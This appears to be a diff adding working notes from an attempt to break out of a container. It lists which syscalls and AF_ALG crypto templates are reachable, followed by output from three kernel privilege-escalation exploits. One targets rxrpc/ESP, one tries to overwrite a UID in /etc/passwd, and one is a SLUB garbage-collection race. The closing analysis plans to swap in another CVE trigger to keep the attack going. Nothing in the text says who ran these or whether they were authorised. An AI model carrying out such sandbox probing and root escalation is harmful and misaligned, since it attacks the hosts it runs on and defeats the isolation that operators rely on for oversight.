@@ -1,0 +1,89 @@
+# Syscall Test Results from Inside Container
+# Tested 2026-10-21
+
+## Custom Binary Tests (musl-gcc static, ran inside container)
+
+### test_syscalls results:
+socket(AF_ALG): OK fd=3 e=0
+add_key: FAIL ret=-1 e=1 Operation not permitted
+keyctl: FAIL ret=-1 e=1 Operation not permitted
+request_key: FAIL ret=-1 e=1 Operation not permitted
+socket(AF_RXRPC): FAIL fd=-1 e=93 Protocol not supported
+memfd_create: OK fd=3 e=0
+splice: FAIL ret=-1 e=22 Invalid argument (params bad, syscall allowed)
+fork: OK pid=1130873 e=0
+
+### test_bind (AF_ALG templates) results:
+bind(authencesn(hmac(sha256),cbc(aes))): FAIL (errno=2 No such file or directory)
+bind(authenc(hmac(sha256),cbc(aes))): FAIL (errno=2 No such file or directory)
+bind(gcm(aes)): FAIL (errno=2 No such file or directory)
+bind(rfc4106(gcm(aes))): FAIL (errno=2 No such file or directory)
+bind(ccm(aes)): FAIL (errno=2 No such file or directory)
+bind(rfc4309(ccm(aes))): FAIL (errno=2 No such file or directory)
+skcipher(cbc(aes)): OK (errno=0)   ← WORKS!
+skcipher(xts(aes)): OK (errno=0)   ← WORKS!
+skcipher(ecb(aes)): OK (errno=0)   ← WORKS!
+
+### test_more (advanced syscalls) results:
+socket(SCTP): OK fd=3 e=0           ← SCTP WORKS!
+socket(AF_UNIX_STREAM): OK fd=3
+socket(NETLINK): OK fd=3 e=0
+io_uring_setup: FAIL ret=-1 e=1 Operation not permitted
+userfaultfd: FAIL ret=-1 e=1 Operation not permitted
+ptrace: OK ret=0 e=0
+perf_event_open: FAIL ret=-1 e=1 Operation not permitted
+mount: FAIL ret=-1 e=1 Operation not permitted
+
+### test_pkt (AF_PACKET) results:
+AF_PACKET SOCK_DGRAM: FAIL fd=-1 e=1 Operation not permitted
+AF_PACKET SOCK_RAW: FAIL fd=-1 e=1 Operation not permitted
+
+### test_xfrm (NETLINK_XFRM) results:
+NETLINK_XFRM: OK fd=3 e=0
+bind: OK r=0 e=0
+XFRM_MSG_NEWSA sendto: OK s=240 e=0
+response: type=2 len=260 error=-1 (Operation not permitted)  ← needs CAP_NET_ADMIN
+
+### DirtyFrag (dirtyfrag_go --force-rxrpc) output:
+=== rxrpc/rxkad LPE (uid=1000 → root) ===
+[+] rxrpc module autoloaded         ← MODULE LOADED SUCCESSFULLY!
+[+] fcrypt selftest OK              ← CRYPTO WORKS!
+=== STAGE 1a: K_A (chars 4-5 = "::")
+=== STAGE 1b: K_B (chars 6-7 = "0:")
+=== STAGE 1c: K_C (chars 8-15 = "0:GGGGGG:")
+=== STAGE 2a: kernel trigger A @ off 4
+[!] trigger A: add_key(evil0): operation not permitted  ← BLOCKED HERE!
+
+### DirtyFrag (dirtyfrag_go --force-esp) output:
+[!] ESP child: fork/exec /tmp/.df: operation not permitted
+
+### Copy Fail (exploit-passwd) output:
+[+] user:    postgres (uid=70)
+[+] /etc/passwd UID field at offset 713
+[+] old field: "70" (2 bytes), new field: "00" (2 bytes)
+[+] sanity check ok
+bind(AF_ALG: authencesn(hmac(sha256),cbc(aes))): No such file or directory
+[-] page-cache mutation failed at offset 713
+
+### bad_garbage output:
+[*] WARNING: 48 online CPUs -- skbuff_head_cache may be order-1
+[*] WARNING: 377.3 GiB physical RAM -- >64 GiB
+[*] bind_to_cpu() warning: Invalid argument (continuing)
+lib_fault(init-rdonly): selected=55 required=362 available=362 stride=512KiB
+[D] LIBFAULT: init ok (flags=0x3: rdonly-scan iodirect-create)
+[D] OFFSETS: resolved from BTF (/sys/kernel/btf/vmlinux)    ← BTF WORKS!
+[*] SELFMAP-BTF ready (offsets resolvable at LPE start)
+[*] SLUB smin=1546 asked=1568 cap=444
+[*] anon_vma alloc 724, free 16: actual free: 678
+[*] cg-4k base: 4096/4096 xattrs pinned (drain at exit)
+[*] slub warm-up: 2 alloc+release cycle(s) done (n=1500)
+CALIBRATION (ONGOING)
+[*] probing this box for the GC-race spin delays
+     [cal] round 1/3  evals=10  best close=599 res=3704  win-rate=0.00 wins/s
+     [cal] round 2/3  evals=20  best close=599 res=3704  win-rate=0.00 wins/s
+     [cal] round 3/3  evals=30  best close=599 res=3704  win-rate=0.00 wins/s
+[!] PHASE no GC-race wins in calibration... aborting
+
+ANALYSIS: bad_garbage framework works (BTF, SLUB, xattr, pipe — all OK),
+but its MSG_PEEK race trigger doesn't apply to kernel 6.8 (legacy GC).
+Need to swap trigger for CVE-2026-80521 send+close race.
